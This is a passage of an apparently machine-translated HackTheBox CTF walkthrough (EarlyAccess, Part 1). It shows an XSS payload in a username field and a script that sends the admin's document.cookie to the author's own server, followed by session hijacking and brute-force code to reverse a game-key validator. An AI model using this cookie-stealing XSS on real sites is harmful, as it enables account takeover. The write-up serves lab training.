<html>
<head>
<title>EarlyAccess from HackTheBox — Detailed Walkthrough — Part 1</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子的早期访问—详细演练—第1部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/earlyaccess-from-hackthebox-detailed-walkthrough-part-1-c895ee3f8471?source=collection_archive---------0-----------------------#2022-02-08">https://infosecwriteups.com/earlyaccess-from-hackthebox-detailed-walkthrough-part-1-c895ee3f8471?source=collection_archive---------0-----------------------#2022-02-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="5b7b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="4714" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/cb3648dfadb6162b9624f6617a287d54.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*CNEJfrV8sJ8qovv_.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">黑客盒子的早期访问</figcaption></figure><p id="834c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">EarlyAccess在HackTheBox上被评为硬机。这是一个又长又复杂的盒子，以一个虚构的游戏开发公司为主题。</p><p id="2cab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我把这个演练分成两部分，因为它相当长！</p><p id="1932" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们首先注册进入一个论坛，发现有一个XSS漏洞。最终，我们找到了一种方法来捕获管理员的会话令牌，并使用它来以他们的身份访问门户。这让我们下载一个密钥生成器，在破译它如何工作后，我们生成一个潜在的列表，并使用Burp入侵者进行暴力破解。使用有效的密钥，我们可以登录到一个新的区域，在那里我们发现了一个SQLi漏洞，我们用它来转储数据库凭证。这给了我们一个散列值，我们可以破解它来访问网站的第三个区域。在这里，我们使用参数篡改来检索文件，从而发现一个调试函数，让我们最终获得一个反向shell。一旦进入，我们就在容器中导航，找到一个井字游戏，最终崩溃并获得根。</p><p id="9bc1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需技能是XXS和SQLi技术的知识。还需要能够理解Python。学到的技能是更深层次的Python和JavaScript知识，使用Burp入侵者，研究和利用开发技术。</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.com/home/machines/profile/375" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">破解机箱::渗透测试实验室—早期访问</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.com</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="2885" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="1915" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/83a3435fd4cd40839f2d32e41f32c136.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*c_xCJ_oCoAg8YCAOrVqaRw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">盒子的Nmap扫描</figcaption></figure><p id="99be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以从ssl证书中看到站点的通用名称。让我们将它添加到hosts文件中:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="77d0" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/meta]<br/>└─# echo "10.10.11.110 earlyaccess.htb" &gt;&gt; /etc/hosts</span></pre><h1 id="5af1" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">曼巴网站</h1><p id="79ba" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们可以浏览这个网站，它看起来不错:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/2231cd4b3da5910d04bb4e0f9c7b61b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1322/format:webp/0*62yQAMxl2pXWaT1a.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">曼巴网站</figcaption></figure><p id="c178" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是没有内容，我们在这里注册一个账号吧:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/7ec1617dfeef065ed17c5203cbaebbab.png" data-original-src="https://miro.medium.com/v2/resize:fit:724/format:webp/0*ja0NqsbD2T-wwTys.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">在Mamba上注册帐户</figcaption></figure><p id="b5d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在仪表板这里结束:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/aac37a06790041a25fda009456748dbc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1242/format:webp/0*hzY-nyamc-t5WMAk.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">曼巴仪表板</figcaption></figure><p id="d6d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">环顾四周，我在论坛上发现了这个帖子:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/1917956577d6d7db2036564adfdde2c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:962/format:webp/0*AEa3t0x4K1qkstCU.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">曼巴论坛帖子</figcaption></figure><p id="c23f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个明确的线索表明我们在某个地方有SQLi。在消息区域，单击联系我们，您可以向管理员发送消息:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/ee88cb85186cec7ca9b74ac45922918e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1242/format:webp/0*Okk3xltFfwv7cGYe.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">将消息作为测试发送</figcaption></figure><p id="46ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当它发出后，您会收到以下消息:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/39aed93fab29195a6149ab692222504c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1014/format:webp/0*n5fOr317hgh_s42G.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">来自系统的消息回复</figcaption></figure><p id="cf13" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">另一条线索是，这条线索表明有一个脚本正在运行以读取发送的信息。</p><h1 id="daf8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">XSS利用</h1><p id="6563" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我花了很长时间才想出下一步该做什么！第一个线索是，用户名是脆弱的，原来你可以用它做XSS。所以首先我找到了这个:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="8f87" class="nc km iq my b gy nd ne l nf ng">function httpGet(theUrl)<br/>{<br/>        var xmlHttp = new XMLHttpRequest();<br/>        xmlHttp.open("GET", theUrl, false);<br/>        xmlHttp.send(null);<br/>        return xmlHttp.responseText;<br/>}<br/>httpGet("https://10.10.14.11:4443/"+document.cookie);</span></pre><p id="5934" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我已经把它保存到Kali上的一个名为pencer.js的文件中，然后在那里启动一个web服务器，这样机器就可以访问它。</p><p id="84aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们需要在个人资料页面的我的用户名中使用XSS来调用它:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/e7f38f81a7a8751356f692dc57696bad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1148/format:webp/0*NvfdEjscim4sdQBv.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">名称字段中的XSS有效负载</figcaption></figure><p id="4ade" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，我刚刚添加了一个简单的XSS回调函数到我的Kali IP来获取pencer.js文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="7481" class="nc km iq my b gy nd ne l nf ng">&lt;script src="https://10.10.14.11:4443/pencer.js" /&gt;</span></pre><p id="2600" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然而这没有用:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi no"><img src="../Images/9a420c41e12c135a35b539f21bc5f331.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Ux3kTlFrz8wxi3jd.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Python web服务器</figcaption></figure><p id="0e72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我试了一个PHP服务器，它给了我更多的信息:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="99ba" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# php -S 0.0.0.0:4443<br/>[Sun Jan 30 21:58:19 2022] PHP 7.4.26 Development Server (http://0.0.0.0:4443) started<br/>[Sun Jan 30 22:08:17 2022] 10.10.11.110:41902 Accepted<br/>[Sun Jan 30 22:08:17 2022] 10.10.11.110:41902 Invalid request (Unsupported SSL request)<br/>[Sun Jan 30 22:08:17 2022] 10.10.11.110:41902 Closing</span></pre><h1 id="892e" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Python HTTPS服务器</h1><p id="5575" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我忘记了该网站是HTTPS，所以我的服务器在卡利需要有能力，以及。我搜索了一个python https服务器，找到了<a class="ae nm" href="https://stackoverflow.com/questions/19705785/python-3-simple-https-server" rel="noopener ugc nofollow" target="_blank">这个</a>，我只是更改了服务器地址和pem文件名:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="5ec2" class="nc km iq my b gy nd ne l nf ng">import http.server, ssl<br/>server_address = ('0.0.0.0', 4443)<br/>httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)<br/>httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='pencer.pem', ssl_version=ssl.PROTOCOL_TLS)<br/>httpd.serve_forever()</span></pre><p id="e125" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了创建与我的Python HTTPS服务器一起使用的pem文件，我使用了<a class="ae nm" href="https://github.com/3gstudent/pyXSSPlatform" rel="noopener ugc nofollow" target="_blank">这个</a>来向我展示正确的opennssl命令:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="ed2e" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# openssl req -new -x509 -keyout pencer.pem -out pencer.pem -days 3650 -nodes<br/>Generating a RSA private key<br/>.......+++++<br/>............................................+++++<br/>writing new private key to 'pencer.pem'<br/>-----<br/>You are about to be asked to enter information that will be incorporated<br/>into your certificate request.<br/>What you are about to enter is what is called a Distinguished Name or a DN.<br/>There are quite a few fields but you can leave some blank<br/>For some fields there will be a default value,<br/>If you enter '.', the field will be left blank.<br/>-----<br/>Country Name (2 letter code) [AU]:<br/>State or Province Name (full name) [Some-State]:<br/>Locality Name (eg, city) []:<br/>Organization Name (eg, company) [Internet Widgits Pty Ltd]:<br/>Organizational Unit Name (eg, section) []:<br/>Common Name (e.g. server FQDN or YOUR name) []:<br/>Email Address []:</span></pre><p id="2198" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在启动Python HTTPS服务器:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="feb6" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# python3 https-server.py</span></pre><p id="9974" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后切换回盒子，像之前一样发送另一条消息:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/de61fb4d3ce50b7ea2d7975e69dc2d83.png" data-original-src="https://miro.medium.com/v2/resize:fit:1242/format:webp/0*pOU9v_qdIsNm3qAn.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">发送另一条测试消息</figcaption></figure><h1 id="ef82" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">管理员Cookie窃取者</h1><p id="d214" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">等待几分钟，如果一切都按计划进行，我们会看到box进行联系，我们的cookie窃取JavaScript文件被拉回到box，它将admin用户cookie返回给我们:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi no"><img src="../Images/1a922aabe4ca50583eb1614f6f43648c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*d9s-leQlQDQmLBb-.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Python HTTPS服务器捕获响应</figcaption></figure><p id="b80c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，返回了两个cookiess，XRSF-TOKEN和earlyaccess_session，我们需要第二个cookie，我将它剪成这样:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi no"><img src="../Images/f018b272d61acaef4c7013153adb7d9b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*lYHd6-kpiM0Y2TVL.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">从响应中删除earlyaccess_session cookie</figcaption></figure><p id="d853" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只需复制两次剪切后的文本，并使用Cookie编辑器或类似工具将其粘贴到浏览器中:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi np"><img src="../Images/a6db0f641973f08f7bb899a1522cf5d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:780/format:webp/0*ncfl9YIHRBiV4phP.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">编辑cookie并粘贴新的</figcaption></figure><h1 id="b606" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">管理员访问</h1><p id="10e5" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">保存cookie并刷新以管理员身份登录仪表板:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/f1caadf1d1a2e00351cb825e3b1a7ff4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1118/format:webp/0*Juo82YA1C_ZTvOkX.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">刷新并查看我们是管理员</figcaption></figure><p id="1362" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">菜单显示了两个新的子域，将它们添加到hosts文件中:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f239" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# sed -i '/10.10.11.110 earlyaccess.htb/ s/$/ dev.earlyaccess.htb game.earlyaccess.htb/' /etc/hosts</span></pre><p id="459e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">目前，开发和游戏子网站是一个死胡同，因为他们导致登录页面。管理部分只有两部分工作。下载备份一个:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/268ef15893367569b028cea76e4e5455.png" data-original-src="https://miro.medium.com/v2/resize:fit:1254/format:webp/0*8bVb1l_pAhAKloA5.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">密钥验证备份</figcaption></figure><h1 id="f3f7" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">密钥验证程序脚本</h1><p id="49e5" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">这里我们需要下载密钥验证器的备份，所以现在就下载吧。</p><p id="1d62" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在“验证游戏密钥”部分，我们将输入使用刚刚下载的备份创建的密钥:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/2897d09dc2b81083825cd693ef639bdd.png" data-original-src="https://miro.medium.com/v2/resize:fit:962/format:webp/0*tSjCj0rYwlLzXvtp.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">验证游戏密钥</figcaption></figure><p id="f33e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换到终端并解压缩备份:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="8b0c" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# unzip backup.zip<br/>Archive:  backup.zip<br/>  inflating: validate.py</span></pre><p id="4284" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行Python脚本，我们得到如下结果:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="b518" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# python3 validate.py<br/>        # Game-Key validator #<br/>        Can be used to quickly verify a user's game key, when the API is down (again).<br/>        Keys look like the following:<br/>        AAAAA-BBBBB-CCCC1-DDDDD-1234<br/>        Usage: validate.py &lt;game-key&gt;</span></pre><p id="5201" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个脚本不是很长，但是如果你不理解Python的话，很难理解。它基本上有五个部分，每个部分创建一个我们在上面的例子中看到的密钥部分。我用<a class="ae nm" href="https://www.programiz.com/python-programming/online-compiler" rel="noopener ugc nofollow" target="_blank">这个</a>在线Python编译器来玩每个部分，弄清楚它做了什么。</p><p id="8aeb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们依次来看，我们可以看到第一部分有五个字符长。验证我们输入的脚本部分在这里:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="b8fb" class="nc km iq my b gy nd ne l nf ng">def g1_valid(self) -&gt; bool:<br/>    g1 = self.key.split('-')[0]<br/>    r = [(ord(v)&lt;&lt;i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]<br/>    if r != [221, 81, 145]:<br/>        return False<br/>    for v in g1[3:]:<br/>        try:<br/>            int(v)<br/>        except:<br/>            return False<br/>    return len(set(g1)) == len(g1)</span></pre><p id="c7d0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它获取第一个破折号之前的数字，并对前三个字符执行<a class="ae nm" href="https://pythonguides.com/percent-sign-mean-in-python" rel="noopener ugc nofollow" target="_blank">模</a>和<a class="ae nm" href="https://www.askpython.com/python/built-in-methods/python-chr-and-ord-methods" rel="noopener ugc nofollow" target="_blank">序数</a>求和，以检查它们是否等于十进制值221、81和145。然后，它检查字符4和5是整数，这些可以是任何数字。</p><p id="0ccd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">更改上面的内容，我们可以根据总和测试字母表中的每个字符，结果是:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="538c" class="nc km iq my b gy nd ne l nf ng">import string<br/>g1_numbers=[221, 81, 145]<br/>g1_results=""<br/>i=0<br/>for a in g1_numbers:<br/>    for b in [c for c in string.ascii_uppercase+string.digits]:<br/>        if (ord(b)&lt;&lt;i+1)%256^ord(b) == a:<br/>            g1_results+=b<br/>    i+=1<br/>g1_results+="10"<br/>print (g1_results)</span></pre><p id="4290" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的钥匙看起来像第一组的钥匙10。接下来，从脚本中我们可以看到:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="15bb" class="nc km iq my b gy nd ne l nf ng">def g2_valid(self) -&gt; bool:<br/>   g2 = self.key.split('-')[1]<br/>   p1 = g2[::2]<br/>   p2 = g2[1::2]<br/>   return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))</span></pre><p id="5654" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个只是使用<a class="ae nm" href="https://blog.finxter.com/python-double-colon/" rel="noopener ugc nofollow" target="_blank">双冒号</a>函数从传递给它的五个字符中提取元素来检查p1是否等于p2。然后它<a class="ae nm" href="https://www.programiz.com/python-programming/methods/string/encode" rel="noopener ugc nofollow" target="_blank">编码</a>字符串值并转换成<a class="ae nm" href="https://www.geeksforgeeks.org/python-bytearray-function" rel="noopener ugc nofollow" target="_blank">字节数组</a>。</p><p id="dc2c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">就像我拿走代码之前一样，修改它以便我可以测试值:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9dc0" class="nc km iq my b gy nd ne l nf ng">g2 = "0A0O0"<br/>p1 = g2[::2]<br/>p2 = g2[1::2]<br/>print (sum(bytearray(p1.encode())))<br/>print (sum(bytearray(p2.encode())))</span></pre><p id="3439" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我只是摆弄了一下g2的值，发现0A0O0给出的输出是144，144满足检查，所以我知道0A0O0是有效的。</p><p id="e201" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的密钥现在看起来像这个密钥10–0a0o 0。</p><p id="80cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第三组接下来，脚本是这样的:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="5a7b" class="nc km iq my b gy nd ne l nf ng">def g3_valid(self) -&gt; bool:<br/>    # TODO: Add mechanism to sync magic_num with API<br/>    g3 = self.key.split('-')[2]<br/>    if g3[0:2] == self.magic_value:<br/>        return sum(bytearray(g3.encode())) == self.magic_num<br/>    else:<br/>        return False</span></pre><p id="adc8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们还需要查看脚本的开头，以理解magic_value和magic_num是什么:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="1d30" class="nc km iq my b gy nd ne l nf ng">magic_value = "XP" # Static (same on API)<br/>magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)</span></pre><p id="d291" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由此我们知道前两个字符需要是XP。脚本还告诉我们接下来的两个字符是字母，最后一个字符是数字。最后，我们知道这剩下的三个字符与XP组合在一起被编码，然后转换成bytearray，然后求和。这需要等于幻数，我们看到它每30分钟就会改变一次。这意味着我们需要计算所有可能的值，然后在站点上依次尝试每一个值，看哪一个在该点是有效的。</p><p id="e90f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们假设AA0是最后三个字符的第一个可能组合，那么我们知道幻数的最小值是178，我们可以检查:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="07c6" class="nc km iq my b gy nd ne l nf ng">magic_value="AA0"<br/>print (sum(bytearray(magic_value.encode())))</span></pre><p id="199e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们只需要做三个循环来尝试每个可能的组合，并返回任何大于我们的幻数的组合:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="898d" class="nc km iq my b gy nd ne l nf ng">import string<br/>magic_num=178<br/>for a in [x for x in string.ascii_uppercase]:<br/>    for b in [x for x in string.ascii_uppercase]:  <br/>        for c in [x for x in string.digits]:<br/>            last_3_chars=a+b+str(c)<br/>            if sum(bytearray(last_3_chars.encode())) &gt; magic_num:<br/>                g3="XP"+last_3_chars+"-"<br/>                magic_num+=1<br/>                print (g3)</span></pre><p id="5cfc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来是第四组。以下是脚本:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="a4ff" class="nc km iq my b gy nd ne l nf ng">def g4_valid(self) -&gt; bool:<br/>        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]</span></pre><p id="5937" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个简单一点。它只是获取我们为第一个组找到的值，并使用Python <a class="ae nm" href="https://realpython.com/python-zip-function/" rel="noopener ugc nofollow" target="_blank"> zip </a>函数用第四个组的值创建一个元组。然后，它对这两个序数进行<a class="ae nm" href="https://www.kite.com/python/answers/how-to-take-the-bitwise-xor-of-two-strings-in-python" rel="noopener ugc nofollow" target="_blank">异或</a>运算，并检查结果是否与12、4、20、117和0这五个给定的数字相同。</p><p id="3e26" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以改变一下，找出第四组是什么:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="fd9f" class="nc km iq my b gy nd ne l nf ng">import string<br/>g1_result="KEY10"<br/>g4_values = [12, 4, 20, 117, 0]<br/>g4_result=""<br/>test_values = [a for a in string.ascii_uppercase+string.digits]<br/>i=0<br/>for b in g1_result:<br/>    for c in test_values:<br/>        if ord(b) ^ ord(c) == g4_values[i]:<br/>            g4_result+=c<br/>            i+=1<br/>            break<br/>print (g4_result)</span></pre><p 